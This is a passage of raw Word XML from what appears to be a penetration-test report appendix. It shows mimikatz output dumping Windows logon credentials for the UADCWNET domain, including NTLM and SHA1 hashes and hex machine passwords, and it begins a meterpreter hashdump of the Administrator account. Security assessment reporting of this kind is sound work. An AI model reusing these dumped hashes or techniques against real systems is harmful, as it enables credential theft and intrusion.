    <w:p w14:paraId="529C0B64" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Session         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Service from 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476DEDBE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">User Name       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> LOCAL SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4679DF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Domain          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> NT AUTHORITY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBE56C6" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Server    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A13BFF2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Time      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 12/16/2019 3:00:13 PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B794D5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">SID             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> S-1-5-19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D59B34" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msv :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AFDBFB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>tspkg :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D96E79A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>wdigest :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="113FDA5C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A8C5F9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABFD765" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB713C8" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>kerberos :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="467ED48B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AACC020" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2053471F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DC2C48" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ssp :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9B8C96" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>credman :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6D4CCE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="28284D69" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Authentication </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 0 ; 45131 (00000000:0000b04b)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2E6F11" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Session         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UndefinedLogonType from 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6967A24F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">User Name       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CAA750" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Domain          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44817025" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Server    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B80B3E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Time      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 12/16/2019 3:00:12 PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13940E29" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">SID             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EFFD0F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msv :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECBEAD6" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> [00000003] Primary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFCEB08" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D18333" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A30794" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * NTLM   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2d01a086b1165cab51888b34b61505d4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D66A09D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * SHA1   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> c27e51748458d01082785f842d63ab0ef74fd25f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452C9DCC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>tspkg :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAE7120" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>wdigest :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E36C68B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>kerberos :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="266BAE3F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ssp :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C086202" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>credman :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A4A644" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="1F8B59BE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Authentication </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 0 ; 999 (00000000:000003e7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFE9C19" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Session         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UndefinedLogonType from 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B74F43" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">User Name       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04689190" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Domain          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA4FB15" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Server    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66413030" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Time      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 12/16/2019 3:00:12 PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE2A04A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">SID             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> S-1-5-18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2C2494" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msv :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A84189B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>tspkg :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B0E027" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>wdigest :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="74941D18" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712D1541" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69956269" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Password : f8 89 a4 82 89 2a 62 47 7a 7e 06 7d a4 cb f4 0f 5c 07 c9 e5 af f5 31 1e 59 4c 80 0f a8 d1 d0 2b 51 1a 85 bd c4 4b 60 3b 20 fc 00 dd 7b 65 5e 64 23 70 01 b1 88 12 5c 7f 00 21 0f f3 ed 81 ec 31 ab 16 07 b9 68 0a c9 24 b0 08 a0 da bf 66 7d 82 a2 fc 39 f0 aa 6e 4c d6 3a a1 30 64 fc 33 7e 4e 52 60 26 9c 62 dc c7 84 b5 68 ff 35 c6 77 31 d2 bd 0a ab a5 0a 5c 77 92 48 06 81 5d 5f d3 f6 0c b3 d5 69 d0 0a ce 6d c8 3f 14 b1 73 93 13 54 5a 04 01 94 20 11 f8 af b9 84 f1 0d 06 6c 84 f3 51 78 d2 8d 9f 74 af c2 cc 49 72 96 04 94 03 ef bf f7 85 6e 8b e0 e0 66 47 92 c4 77 eb 1f b8 04 7b 81 da 75 a7 aa 5b 0d fa c4 af 6a a8 18 26 3e 96 54 8d ab 73 b7 79 0c 58 6b 05 07 41 be 32 55 b7 ef 4b be 64 e8 78 66 c9 68 e8 46 4e 7a d0 73 45 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22ED4378" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>kerberos :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="03420699" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> server2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1703D14F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET.COM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0881803F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Password : f8 89 a4 82 89 2a 62 47 7a 7e 06 7d a4 cb f4 0f 5c 07 c9 e5 af f5 31 1e 59 4c 80 0f a8 d1 d0 2b 51 1a 85 bd c4 4b 60 3b 20 fc 00 dd 7b 65 5e 64 23 70 01 b1 88 12 5c 7f 00 21 0f f3 ed 81 ec 31 ab 16 07 b9 68 0a c9 24 b0 08 a0 da bf 66 7d 82 a2 fc 39 f0 aa 6e 4c d6 3a a1 30 64 fc 33 7e 4e 52 60 26 9c 62 dc c7 84 b5 68 ff 35 c6 77 31 d2 bd 0a ab a5 0a 5c 77 92 48 06 81 5d 5f d3 f6 0c b3 d5 69 d0 0a ce 6d c8 3f 14 b1 73 93 13 54 5a 04 01 94 20 11 f8 af b9 84 f1 0d 06 6c 84 f3 51 78 d2 8d 9f 74 af c2 cc 49 72 96 04 94 03 ef bf f7 85 6e 8b e0 e0 66 47 92 c4 77 eb 1f b8 04 7b 81 da 75 a7 aa 5b 0d fa c4 af 6a a8 18 26 3e 96 54 8d ab 73 b7 79 0c 58 6b 05 07 41 be 32 55 b7 ef 4b be 64 e8 78 66 c9 68 e8 46 4e 7a d0 73 45 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B21B25F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ssp :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C4DD47" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>credman :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="49699C86" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="73A68F34" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t>mimikatz #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D0A584" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A6A9AE2" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc27518421"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Hash Dump from </w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C4B973" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="708" w:firstLine="708"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Administrator:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>500</w:t>
      </w:r>
      <w:r w:rsidRPr="001B2AC3">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>aad</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00851413">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>3b435b51404eeaad3b435b51404ee:e21be3c4d0977c59466a16de93d968f4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240B599B" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="004956A5">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
